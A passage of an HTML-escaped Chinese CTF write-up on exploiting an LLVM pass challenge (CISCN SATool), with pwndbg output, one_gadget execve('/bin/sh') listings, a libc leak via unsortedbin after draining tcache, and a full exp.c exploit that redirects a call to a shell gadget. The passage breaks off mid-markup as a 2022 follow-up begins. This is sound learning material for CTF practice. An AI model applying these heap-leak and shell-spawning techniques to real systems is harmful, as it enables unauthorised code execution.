class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;─────────────────────────────────[ REGISTERS ]──────────────────────────────────&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;*RAX  &lt;span class=&#34;number&#34;&gt;0x7ffff33412fc&lt;/span&gt; (exec_comm+&lt;span class=&#34;number&#34;&gt;2508&lt;/span&gt;) ◂— mov    rax, qword ptr [rip + &lt;span class=&#34;number&#34;&gt;0x2e0ba5&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;*RBX  &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;*RCX  &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;*RDX  &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;*RDI  &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;*RSI  &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;*R8   &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;*R9   &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;*R10  &lt;span class=&#34;number&#34;&gt;0x7c7738&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0x822940&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0x7fffffffdcf8&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0x7e4b50&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0x7e4b70&lt;/span&gt; ◂— ...&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;*R11  &lt;span class=&#34;number&#34;&gt;0x7ffff33f3b20&lt;/span&gt; ◂— pop    rdi&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;*R12  &lt;span class=&#34;number&#34;&gt;0x826e10&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0x7c7738&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0x822940&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0x7fffffffdcf8&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0x7e4b50&lt;/span&gt; ◂— ...&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; R13  &lt;span class=&#34;number&#34;&gt;0x7fffffffda20&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0x7fffffffda30&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x79656b006e7572&lt;/span&gt; &lt;span class=&#34;comment&#34;&gt;/* &amp;#x27;run&amp;#x27; */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;*R14  &lt;span class=&#34;number&#34;&gt;0x826e40&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0x826d88&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0x826c80&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0x826b80&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0x826990&lt;/span&gt; ◂— ...&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;*R15  &lt;span class=&#34;number&#34;&gt;0x826e28&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0x7e5218&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0x7fffffffdcf8&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0x7e4b50&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0x7e4b70&lt;/span&gt; ◂— ...&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;*RBP  &lt;span class=&#34;number&#34;&gt;0x8249c0&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0x6e7572&lt;/span&gt; (isl_basic_set_compute_vertices+&lt;span class=&#34;number&#34;&gt;2114&lt;/span&gt;) ◂— js     &lt;span class=&#34;number&#34;&gt;0x6e757c&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;*RSP  &lt;span class=&#34;number&#34;&gt;0x7fffffffd950&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;*RIP  &lt;span class=&#34;number&#34;&gt;0x7ffff23a21ec&lt;/span&gt; ◂— call   rax&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;───────────────────────────────────[ DISASM ]───────────────────────────────────&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; ► &lt;span class=&#34;number&#34;&gt;0x7ffff23a21ec&lt;/span&gt;    call   rax                           &amp;lt;exec_comm+&lt;span class=&#34;number&#34;&gt;2508&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        rdi: &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        rsi: &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        rdx: &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        rcx: &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;先看看有没有合适的寄存器的 one_gadget, 没有的话在选择 stack 布局。&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;dreamcat@ubuntu:~/Desktop/llvm/SATool_2021_ciscn$ one_gadget /lib/x86_64-linux-gnu/libc-2.27.so -l3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x4f2a5 execve(&lt;span class=&#34;string&#34;&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;, rsp+0x40, environ)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;constraints:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  rsp &amp;amp; 0xf == 0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  rcx == NULL&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x4f302 execve(&lt;span class=&#34;string&#34;&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;, rsp+0x40, environ)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;constraints:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  [rsp+0x40] == NULL&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0xe534f execve(&lt;span class=&#34;string&#34;&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;, r13, rbx)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;constraints:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  [r13] == NULL || r13 == NULL&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  [rbx] == NULL || rbx == NULL&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0xe54f7 execve(&lt;span class=&#34;string&#34;&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;, [rbp-0x88], [rbp-0x70])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;constraints:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  [[rbp-0x88]] == NULL || [rbp-0x88] == NULL&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0xe54fe execve(&lt;span class=&#34;string&#34;&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;, rcx, [rbp-0x70])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;constraints:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  [rcx] == NULL || rcx == NULL&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0xe5502 execve(&lt;span class=&#34;string&#34;&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;, rcx, rdx)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;constraints:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  [rcx] == NULL || rcx == NULL&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  [rdx] == NULL || rdx == NULL&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x10a2fc execve(&lt;span class=&#34;string&#34;&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;, rsp+0x70, environ)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;constraints:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  [rsp+0x70] == NULL&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x10a308 execve(&lt;span class=&#34;string&#34;&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;, rsi, [rax])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;constraints:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  [rsi] == NULL || rsi == NULL&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  [[rax]] == NULL || [rax] == NULL&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;好多可以用的。&lt;/p&gt;
&lt;p&gt;问题来了我们怎么泄露 libc? 或者能否直接得到一个与 libc 相关的值？&lt;/p&gt;
&lt;p&gt;其实在第一次调试的时候吗，我们注意到第一次申请 0x20chunk 的时候，bins 不是空的，有 0x20 的 smallbin，largebin，u 你 sorted 斌，以及 tcache 中也有 7 个 bin。所以我们 save7 次将 tcache 取完，下一次就可以从 unsortedbin 中拿到，并且 fd 指向的是 main_arena+96, 与 libc 相关。我们只需要计算一下 offset 就可以了。&lt;/p&gt;
&lt;p&gt;我们申请第 8 个 chunk 的时候就选择空输入（’\x00’），就不会变动 fd。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;C:%5CUsers%5C32644%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20220612021912812.png&#34; alt=&#34;image-20220612021912812&#34;&gt;&lt;/p&gt;
&lt;p&gt;这里可选择的 one_gadget 就很多了。选择了&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x10a2fc&lt;/span&gt; execve(&lt;span class=&#34;string&#34;&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;, rsp+&lt;span class=&#34;number&#34;&gt;0x70&lt;/span&gt;, environ)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;constraints:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  [rsp+&lt;span class=&#34;number&#34;&gt;0x70&lt;/span&gt;] == &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;完整的 exp.c&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;run&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&amp;#123;&lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;save&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *a1,&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *a2)&lt;/span&gt;&amp;#123;&lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;fakekey&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(int64)&lt;/span&gt;&amp;#123;&lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;takeaway&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *a1)&lt;/span&gt;&amp;#123;&lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;B4ckDo0r&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        save(&lt;span class=&#34;string&#34;&gt;&amp;quot;aaaa&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;bbbb&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        save(&lt;span class=&#34;string&#34;&gt;&amp;quot;aaddd&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;aadd&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        save(&lt;span class=&#34;string&#34;&gt;&amp;quot;ssss&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;sss&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        save(&lt;span class=&#34;string&#34;&gt;&amp;quot;ssss&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;sssss&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        save(&lt;span class=&#34;string&#34;&gt;&amp;quot;sssss&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;sssss&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        save(&lt;span class=&#34;string&#34;&gt;&amp;quot;sssss&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;sssss&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	save(&lt;span class=&#34;string&#34;&gt;&amp;quot;sssss&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;sssss&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        save(&lt;span class=&#34;string&#34;&gt;&amp;quot;\x00&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;ssssss&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        stealkey();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        fakekey(&lt;span class=&#34;number&#34;&gt;-0x2E19b4&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        run();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;补充点，runOnFunction 会检查我们 exp 的入口是不是 B4ckDo0r，因为我们习惯 C 语言的代码为 main 为程序的入口。&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;dest[&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;] = __readfsqword(&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;u);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  name = (_QWORD *)llvm::Value::getName(a2);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( v3 == &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt; &amp;amp;&amp;amp; *name == &lt;span class=&#34;string&#34;&gt;&amp;#x27;r0oDkc4B&amp;#x27;&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;ciscn-2022-satool&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ciscn-2022-satool&#34;&gt;#&lt;/a&gt; ciscn 2022 satool&lt;/h2&gt;
&lt;p&gt;这里我依旧是跟着师傅们的文章一边复现一边记录学习。&lt;/p&gt;
&lt;p&gt;首先还是看 readme，&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td 